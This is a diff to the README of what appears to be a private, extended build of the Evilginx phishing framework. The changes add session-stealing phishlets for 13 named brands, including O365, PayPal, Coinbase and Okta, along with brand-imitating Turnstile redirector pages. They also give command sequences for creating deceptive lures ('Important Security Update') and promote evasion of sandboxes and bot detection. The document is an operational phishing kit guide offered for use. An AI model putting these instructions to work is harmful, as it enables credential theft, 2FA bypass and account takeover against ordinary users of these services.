@@ -15,6 +15,21 @@ This **Private Development Edition** includes advanced evasion, detection, and o
 **Original Author:** Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky))  
 **Version:** 3.3.1 - Private Dev Edition
 
+## ✅ Latest Updates (Nov 2025)
+
+**All Systems Validated:**
+- ✅ **13 Phishlets Debugged** - Fixed `force_post` fields in all auth_tokens sections
+- ✅ **13 Turnstile Redirectors** - Complete Cloudflare CAPTCHA integration for all phishlets
+- ✅ **Perfect 1:1 Mapping** - Every phishlet has a matching Turnstile redirector
+- ✅ **Build Tested** - Compiles successfully with Go 1.25.1 (19.6 MB executable)
+- ✅ **Clean Structure** - Orphaned redirectors removed, optimized directory layout
+
+**Included Phishlets:**
+Amazon, Apple, Booking, Coinbase, Facebook, Instagram, LinkedIn, Netflix, O365, Okta, PayPal, Salesforce, Spotify
+
+**Turnstile Redirectors:**
+All phishlets include professional Cloudflare Turnstile verification pages with browser compatibility files (manifest.json, site.webmanifest, apple-touch-icon)
+
 <p align="center">
   <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
 </p>
@@ -323,7 +338,7 @@ sudo ./build/evilginx -p ./phishlets
 
 ```bash
 # Start Evilginx
-sudo ./build/evilginx -p ./phishlets
+sudo ./build/evilginx -p ./phishlets -t ./redirectors
 
 # In Evilginx terminal:
 config domain yourdomain.com
@@ -333,10 +348,14 @@ config ipv4 your.vps.ip
 phishlets hostname o365 login.yourdomain.com
 phishlets enable o365
 
-# Create a lure
+# Create a lure with Turnstile redirector
 lures create o365
+lures edit 0 redirector o365_turnstile
+lures edit 0 redirect_url https://office.com
 lures get-url 0
 ```
+
+**Note:** All phishlets now include Cloudflare Turnstile redirectors for enhanced legitimacy and bot protection.
 
 **For complete deployment guide, see [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md)**
 
@@ -549,7 +568,7 @@ Configuration is stored in `~/.evilginx/config.json`:
 
 ```bash
 # Start Evilginx
-sudo ./build/evilginx -p ./phishlets
+sudo ./build/evilginx -p ./phishlets -t ./redirectors
 
 # Configure domain and IP
 config domain example.com
@@ -559,13 +578,29 @@ config ipv4 123.45.67.89
 phishlets hostname o365 login.example.com
 phishlets enable o365
 
-# Create lure
+# Create lure with Turnstile redirector
 lures create o365
+lures edit 0 redirector o365_turnstile
 lures edit 0 redirect_url https://office.com
 
 # Get phishing URL
 lures get-url 0
 ```
+
+**Available Redirectors:**
+- `amazon_turnstile` - Amazon-branded Turnstile verification
+- `apple_turnstile` - Apple-branded Turnstile verification
+- `booking_turnstile` - Booking.com-branded Turnstile verification
+- `coinbase_turnstile` - Coinbase-branded Turnstile verification
+- `facebook_turnstile` - Facebook-branded Turnstile verification
+- `instagram_turnstile` - Instagram-branded Turnstile verification
+- `linkedin_turnstile` - LinkedIn-branded Turnstile verification
+- `netflix_turnstile` - Netflix-branded Turnstile verification
+- `o365_turnstile` - Microsoft O365-branded Turnstile verification
+- `okta_turnstile` - Okta-branded Turnstile verification
+- `paypal_turnstile` - PayPal-branded Turnstile verification
+- `salesforce_turnstile` - Salesforce-branded Turnstile verification
+- `spotify_turnstile` - Spotify-branded Turnstile verification
 
 ### Advanced Campaign with All Features
 
@@ -594,13 +629,21 @@ config telegram_token YOUR_BOT_TOKEN
 config telegram_chat YOUR_CHAT_ID
 config telegram on
 
-# Create sophisticated lure
+# Create sophisticated lure with Turnstile redirector
 lures create o365
+lures edit 0 redirector o365_turnstile
 lures edit 0 redirect_url https://office.com
 lures edit 0 og_title "Important Security Update"
 lures edit 0 og_description "Please verify your account"
 lures edit 0 og_image https://example.com/image.jpg
 ```
+
+**Turnstile Configuration:**
+Each redirector uses Cloudflare Turnstile test sitekey by default. To use in production:
+1. Create a Turnstile site at https://dash.cloudflare.com/?to=/:account/turnstile
+2. Set widget mode to "Invisible" for seamless UX
+3. Replace the test sitekey in `redirectors/<name>_turnstile/index.html`
+4. Look for: `const TURNSTILE_SITEKEY = '0x4AAAAAAB_V5zjG-p6Hl2ZQ';`
 
 ### Domain Rotation Setup
 
@@ -742,7 +785,26 @@ whois yourdomain.com | grep "Name Server"
 config autocert off
 
 # Or enable developer mode for self-signed certs
-./build/evilginx -developer -p ./phishlets
+./build/evilginx -developer -p ./phishlets -t ./redirectors
+```
+
+**Issue: "lures can't read turnstile data" error**
+This is a harmless error from browsers auto-requesting files like `apple-touch-icon.png` or `manifest.json`. 
+The error has no effect on functionality - Turnstile redirectors work correctly.
+
+**Solution (if you want to eliminate the errors):**
+All redirectors now include `manifest.json`, `site.webmanifest`, and `apple-touch-icon.png` to prevent these harmless browser auto-request errors.
+
+**Issue: Redirector not loading**
+```bash
+# Verify redirector directory exists
+ls redirectors/o365_turnstile/
+
+# Check for required files
+# Should have: index.html, default.html, robots.txt, README.md
+
+# Set redirector using just the directory name (no path)
+lures edit <id> redirector o365_turnstile
 ```
 
 **Issue: ML detection false positives**
@@ -816,6 +878,8 @@ config polymorphic_cache on
 | 2FA Bypass | ✅ | ✅ |
 | Phishlet System | ✅ | ✅ |
 | Gophish Integration | ✅ | ✅ |
+| **Turnstile Redirectors** | ❌ | ✅ (13 pre-built) |
+| **Debugged Phishlets** | ❌ | ✅ (13 validated) |
 | **ML Bot Detection** | ❌ | ✅ |
 | **JA3 Fingerprinting** | ❌ | ✅ |
 | **Sandbox Detection** | ❌ | ✅ |
@@ -826,6 +890,24 @@ config polymorphic_cache on
 | **Advanced Obfuscation** | ❌ | ✅ |
 | **Cloudflare Workers** | ❌ | ✅ |
 | **Enhanced Telegram** | ❌ | ✅ |
+
+### Phishlet Status
+
+| Phishlet | Status | Turnstile Redirector | Auth Tokens Fixed |
+|----------|--------|---------------------|-------------------|
+| Amazon | ✅ Ready | ✅ Complete | ✅ force_post added |
+| Apple | ✅ Ready | ✅ Complete | ✅ force_post added |
+| Booking | ✅ Ready | ✅ Complete | ✅ force_post added |
+| Coinbase | ✅ Ready | ✅ Complete | ✅ force_post added |
+| Facebook | ✅ Ready | ✅ Complete | ✅ force_post added |
+| Instagram | ✅ Ready | ✅ Complete | ✅ force_post added |
+| LinkedIn | ✅ Ready | ✅ Complete | ✅ force_post added |
+| Netflix | ✅ Ready | ✅ Complete | ✅ force_post added |
+| O365 | ✅ Ready | ✅ Complete | ✅ Already correct |
+| Okta | ✅ Ready | ✅ Complete | ✅ Fixed + wildcard domains |
+| PayPal | ✅ Ready | ✅ Complete | ✅ force_post added |
+| Salesforce | ✅ Ready | ✅ Complete | ✅ force_post added |
+| Spotify | ✅ Ready | ✅ Complete | ✅ force_post added |
 
 ---
 
